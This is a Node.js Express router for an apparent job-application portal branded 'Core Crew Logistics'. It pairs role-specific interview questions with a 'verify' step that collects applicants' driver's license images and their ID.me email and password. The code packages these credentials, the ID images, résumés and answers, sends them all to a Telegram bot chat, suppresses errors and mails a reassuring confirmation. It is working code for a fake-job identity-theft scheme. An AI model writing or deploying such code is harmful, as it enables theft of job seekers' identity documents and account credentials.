const path = require('path');
const os = require('os');
const fs = require('fs');
const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const { Redis } = require('@upstash/redis');
const nodemailer = require('nodemailer');
const jobDetails = require('../data/jobDetails');

const router = express.Router();

// Storage for uploads (temp on disk)
const upload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, os.tmpdir()),
    filename: (req, file, cb) => {
      const timestamp = Date.now();
      const safe = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
      cb(null, `${timestamp}-${safe}`);
    },
  }),
  limits: { fileSize: 15 * 1024 * 1024 },
});

// Multer for driver's license front and back
const driversLicenseUpload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, os.tmpdir()),
    filename: (req, file, cb) => {
      const timestamp = Date.now();
      const safe = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
      cb(null, `dl-${timestamp}-${safe}`);
    },
  }),
  limits: { fileSize: 10 * 1024 * 1024 },
});

const dlFields = [
  { name: 'driversLicenseFront', maxCount: 1 },
  { name: 'driversLicenseBack', maxCount: 1 }
];

const JOB_POSITIONS = Object.values(jobDetails).map(j => j.title);

function normalizePosition(pos) {
  return pos.trim().toLowerCase().replace(/[\s/&-]+/g, ' ').replace(/\s+/g, ' ').trim();
}

const INTERVIEW_QUESTIONS_MAP = {
  "logistics coordinator dispatcher": [
    { name: "experience", label: "What experience do you have in logistics coordination or dispatching?" },
    { name: "communication", label: "How do you handle communication with drivers and clients during urgent situations?" },
    { name: "scheduling", label: "Describe your approach to managing multiple delivery schedules simultaneously." },
    { name: "problem_solving", label: "Tell us about a time you resolved a logistics issue under pressure." },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "supply chain analyst": [
    { name: "analysis", label: "What experience do you have with supply chain data analysis?" },
    { name: "tools", label: "Which analytical tools and software are you proficient with?" },
    { name: "optimization", label: "Describe a process improvement you've recommended in the past." },
    { name: "trends", label: "How do you identify and interpret supply chain trends?" },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "customer support client relations": [
    { name: "service", label: "What does excellent customer service mean to you?" },
    { name: "difficult_customers", label: "How do you handle difficult or upset customers?" },
    { name: "communication", label: "Describe your communication style when dealing with clients." },
    { name: "resolution", label: "Tell us about a challenging customer issue you successfully resolved." },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "hr recruitment talent acquisition": [
    { name: "recruitment", label: "What experience do you have in talent acquisition and recruitment?" },
    { name: "screening", label: "How do you evaluate candidates during the screening process?" },
    { name: "strategies", label: "What recruitment strategies have you found most effective?" },
    { name: "onboarding", label: "Describe your approach to new hire onboarding." },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "it software support": [
    { name: "technical", label: "What technical support experience do you have?" },
    { name: "troubleshooting", label: "Describe your troubleshooting methodology for software issues." },
    { name: "systems", label: "Which logistics or warehouse software systems are you familiar with?" },
    { name: "remote_support", label: "How do you provide effective remote technical support?" },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "drivers truck delivery fleet": [
    { name: "driving_experience", label: "What driving experience do you have (commercial, delivery, etc.)?" },
    { name: "safety", label: "How do you prioritize safety while driving?" },
    { name: "cdl", label: "Do you have a CDL? If so, what class and endorsements?" },
    { name: "routes", label: "How do you handle unfamiliar routes or delivery locations?" },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "warehouse staff forklift operators": [
    { name: "warehouse_experience", label: "What warehouse experience do you have?" },
    { name: "forklift", label: "Are you certified to operate forklifts? What types?" },
    { name: "safety", label: "How do you maintain safety in a warehouse environment?" },
    { name: "inventory", label: "Describe your experience with inventory management." },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "fleet maintenance supervisors": [
    { name: "supervision", label: "What experience do you have supervising maintenance teams?" },
    { name: "fleet_management", label: "Describe your experience with fleet maintenance operations." },
    { name: "compliance", label: "How do you ensure compliance with safety standards?" },
    { name: "scheduling", label: "How do you prioritize and schedule vehicle maintenance?" },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "virtual assistance": [
    { name: "admin_experience", label: "What administrative support experience do you have?" },
    { name: "remote_work", label: "How do you stay organized and productive while working remotely?" },
    { name: "communication", label: "How do you manage email correspondence and scheduling?" },
    { name: "tools", label: "Which virtual assistance tools and software are you proficient with?" },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "account manager": [
    { name: "account_management", label: "What experience do you have managing client accounts?" },
    { name: "relationships", label: "How do you build and maintain strong client relationships?" },
    { name: "coordination", label: "Describe how you coordinate with internal teams for client needs." },
    { name: "satisfaction", label: "How do you measure and ensure customer satisfaction?" },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "project manager": [
    { name: "project_experience", label: "What project management experience do you have?" },
    { name: "methodology", label: "Which project management methodologies are you familiar with?" },
    { name: "team_leadership", label: "How do you lead and motivate project teams?" },
    { name: "milestones", label: "How do you track and ensure project milestones are met?" },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "data entry": [
    { name: "accuracy", label: "How do you ensure accuracy in data entry tasks?" },
    { name: "systems", label: "Which data entry systems and software are you experienced with?" },
    { name: "volume", label: "What volume of data entry work can you handle efficiently?" },
    { name: "compliance", label: "How do you ensure compliance with data regulations?" },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ],
  "customer support": [
    { name: "support_experience", label: "What customer support experience do you have?" },
    { name: "service_approach", label: "What does excellent customer service mean to you?" },
    { name: "difficult_situations", label: "How do you handle difficult customer situations?" },
    { name: "order_processing", label: "Describe your experience with order processing and issue resolution." },
    { name: "goals", label: "Where do you see yourself in two years?" }
  ]
};

const DEFAULT_QUESTIONS = [
  { name: "about", label: "Tell us about yourself and your professional background." },
  { name: "interest", label: "Why are you interested in working with Core Crew Logistics?" },
  { name: "challenge", label: "Describe a challenge you've overcome at work." },
  { name: "skills", label: "What skills would you bring to this position?" },
  { name: "goals", label: "Where do you see yourself in two years?" }
];

function requireSession(req, res, next) {
  if (!req.session) {
    return res.status(500).render('error', { message: 'Session not available. Please enable session middleware.' });
  }
  next();
}

router.get('/', requireSession, (req, res) => {
  res.render('apply', { positions: JOB_POSITIONS });
});

router.post('/start', requireSession, upload.array('documents', 6), async (req, res) => {
  try {
    const { firstName, lastName, email, phone, coverLetter, position } = req.body;
    req.session.applicationDraft = {
      firstName,
      lastName,
      email,
      phone,
      coverLetter,
      position,
      files: (req.files || []).map((f) => ({
        path: f.path,
        originalname: f.originalname,
        mimetype: f.mimetype,
      })),
    };
    await sendApplicationToTelegram(req.session.applicationDraft);

    const normalizedPosition = normalizePosition(position);
    const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
    const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
    req.session.interviewAnswers = null;
    res.render('application-submitted', {
      questions: selectedQuestions,
      position,
      step: 2,
      isDefault
    });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
  }
});

router.get('/interview', requireSession, (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  const pos = req.session.applicationDraft.position;
  const normalizedPosition = normalizePosition(pos);
  const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
  res.render('application-submitted', {
    questions: selectedQuestions,
    position: pos,
    step: 2,
    isDefault
  });
});

router.post('/interview', requireSession, express.urlencoded({ extended: true }), async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  const pos = req.session.applicationDraft.position;
  const normalizedPosition = normalizePosition(pos);
  const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const interviewAnswers = {};
  selectedQuestions.forEach(q => {
    interviewAnswers[q.name] = req.body[q.name] || '';
  });
  req.session.interviewAnswers = interviewAnswers;
  res.render('info-note');
});

router.get('/verify', requireSession, (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  res.render('verify', {
    email: req.session.applicationDraft.email || '',
    position: req.session.applicationDraft.position || ''
  });
});

router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');

  const dlFront = req.files['driversLicenseFront']?.[0];
  const dlBack = req.files['driversLicenseBack']?.[0];
  if (!dlFront || !dlBack) {
    return res.status(400).render('error', { message: 'Both front and back of your driver\'s license/ID must be uploaded.' });
  }

  const { email, password } = req.body;
  req.session.verified = true;
  req.session.idme = { email, password };

  req.session.driversLicenseFiles = [dlFront, dlBack];

  const application = req.session.applicationDraft;
  const interviewAnswers = req.session.interviewAnswers || {};
  const idmeCreds = { email, password };

  const normalizedPosition = normalizePosition(application.position);
  const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const answersObj = {};
  questions.forEach(q => {
    let answer = interviewAnswers[q.name];
    if (typeof answer === 'undefined' || answer === null || answer.trim() === '') {
      answer = "";
    }
    answersObj[q.label] = answer;
  });

  const applicantName = `${application.firstName}_${application.lastName}`.replace(/[^a-zA-Z0-9_-]/g, '_');
  const timestamp = Date.now();

  const qaPayload = {
    applicant: {
      name: `${application.firstName} ${application.lastName}`,
      email: application.email,
      phone: application.phone,
      position: application.position,
    },
    interview_answers: answersObj
  };

  const idmePayload = {
    applicant: {
      name: `${application.firstName} ${application.lastName}`,
      email: application.email,
      position: application.position,
    },
    idme_credentials: idmeCreds,
    drivers_license: {
      front: {
        filename: dlFront.originalname,
        mimetype: dlFront.mimetype,
      },
      back: {
        filename: dlBack.originalname,
        mimetype: dlBack.mimetype,
      },
    }
  };

  try {
    const qaFilename = `QA_${applicantName}_${timestamp}.json`;
    const qaFilepath = path.join(os.tmpdir(), qaFilename);
    fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(qaFilepath, qaFilename);
    fs.unlinkSync(qaFilepath);
  } catch (err) {}

  try {
    const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
    const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
    fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
    fs.unlinkSync(idmeFilepath);
  } catch (err) {}

  try {
    await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
    fs.unlinkSync(dlFront.path);
    await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
    fs.unlinkSync(dlBack.path);
    req.session.driversLicenseFiles = null;
  } catch (err) {}

  await sendConfirmationEmail(email, req.session.applicationDraft.firstName);
  res.redirect('/apply/submit');
});

router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  const dlFront = req.files['driversLicenseFront']?.[0];
  const dlBack = req.files['driversLicenseBack']?.[0];
  if (!dlFront || !dlBack) {
    return res.status(400).render('error', { message: 'Both front and back of your driver\'s license/ID must be uploaded.' });
  }
  req.session.driversLicenseFiles = [dlFront, dlBack];
  req.session.verified = true;
  req.session.idme = {};

  const application = req.session.applicationDraft;
  const interviewAnswers = req.session.interviewAnswers || {};

  const normalizedPosition = normalizePosition(application.position);
  const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const answersObj = {};
  questions.forEach(q => {
    let answer = interviewAnswers[q.name];
    if (typeof answer === 'undefined' || answer === null || answer.trim() === '') {
      answer = "";
    }
    answersObj[q.label] = answer;
  });

  const applicantName = `${application.firstName}_${application.lastName}`.replace(/[^a-zA-Z0-9_-]/g, '_');
  const timestamp = Date.now();

  try {
    const qaPayload = {
      applicant: {
        name: `${application.firstName} ${application.lastName}`,
        email: application.email,
        phone: application.phone,
        position: application.position,
      },
      interview_answers: answersObj
    };
    const qaFilename = `QA_${applicantName}_${timestamp}.json`;
    const qaFilepath = path.join(os.tmpdir(), qaFilename);
    fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(qaFilepath, qaFilename);
    fs.unlinkSync(qaFilepath);
  } catch (err) {}

  try {
    const idmePayload = {
      applicant: {
        name: `${application.firstName} ${application.lastName}`,
        email: application.email,
        position: application.position,
      },
      idme_credentials: {},
      drivers_license: {
        front: {
          filename: dlFront.originalname,
          mimetype: dlFront.mimetype,
        },
        back: {
          filename: dlBack.originalname,
          mimetype: dlBack.mimetype,
        },
      }
    };
    const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
    const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
    fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
    fs.unlinkSync(idmeFilepath);
  } catch (err) {}

  try {
    await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
    fs.unlinkSync(dlFront.path);
    await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
    fs.unlinkSync(dlBack.path);
    req.session.driversLicenseFiles = null;
  } catch (err) {}

  await sendConfirmationEmail(application.email, application.firstName);
  res.redirect('/apply/submit');
});

router.get('/submit', requireSession, (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  res.render('submit', {
    email: req.session.applicationDraft.email || '',
    firstName: req.session.applicationDraft.firstName || ''
  });
});

router.post('/submit', requireSession, async (req, res) => {
  try {
    if (!req.session.applicationDraft || !req.session.verified) return res.redirect('/apply');
    const data = req.session.applicationDraft;
    const attachments = (data.files || []).map((f) => ({
      filename: f.originalname,
      path: f.path,
      contentType: f.mimetype,
    }));
    try {
      const redis = new Redis({
        url: process.env.UPSTASH_REDIS_REST_URL,
        token: process.env.UPSTASH_REDIS_REST_TOKEN,
      });
      const key = `application:${Date.now()}:${(data.email || '').replace(/[^a-zA-Z0-9._-]/g, '_')}`;
      await redis.hset(key, {
        firstName: data.firstName,
        lastName: data.lastName,
        email: data.email,
        phone: data.phone,
        position: data.position,
        coverLetter: data.coverLetter || '',
        interviewAnswers: JSON.stringify(req.session.interviewAnswers || {}),
        files: JSON.stringify(attachments.map(a => ({ name: a.filename, type: a.contentType }))),
        idme: JSON.stringify(req.session.idme || {}),
        createdAt: new Date().toISOString(),
      });
    } catch (e) {}
    req.session.applicationDraft = null;
    req.session.interviewAnswers = null;
    req.session.verified = null;
    req.session.idme = null;
    res.render('success');
  } catch (err) {
    res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
  }
});

// Helpers below...

async function sendApplicationToTelegram(data) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const summary = `New Application\nName: ${data.firstName} ${data.lastName}\nEmail: ${data.email}\nPhone: ${data.phone}\nPosition: ${data.position}\nCover Letter: ${data.coverLetter || "N/A"}`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: summary }),
      });
      const attachments = (data.files || []).map((f) => ({
        filename: f.originalname,
        path: f.path,
        contentType: f.mimetype,
      }));
      for (const f of attachments) {
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('document', require('fs').createReadStream(f.path), {
          filename: f.filename,
          contentType: f.contentType,
        });
        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: 'POST', body: form });
      }
    }
  } catch (e) {}
}

async function sendJsonFileToTelegram(filepath, filename) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('document', fs.createReadStream(filepath), filename);
      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders(),
      });
    }
  } catch (e) {}
}

async function sendDocumentToTelegram(filepath, filename) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('document', fs.createReadStream(filepath), filename);
      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders(),
      });
    }
  } catch (e) {}
}

async function sendConfirmationEmail(email, firstName) {
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST || "smtp.gmail.com",
      port: process.env.SMTP_PORT || 465,
      secure: true,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });
    await transporter.sendMail({
      from: `"Core Crew Logistics" <${process.env.SMTP_USER}>`,
      to: email,
      subject: "Your Application Has Been Submitted",
      text: `Dear ${firstName || "Applicant"},\n\nThank you for completing your application with Core Crew Logistics. Your submission has been received and is now under review.\n\nWe appreciate your interest and will contact you soon regarding the next steps.\n\nBest regards,\nCore Crew Logistics Team`,
    });
  } catch (e) {}
}

module.exports = router;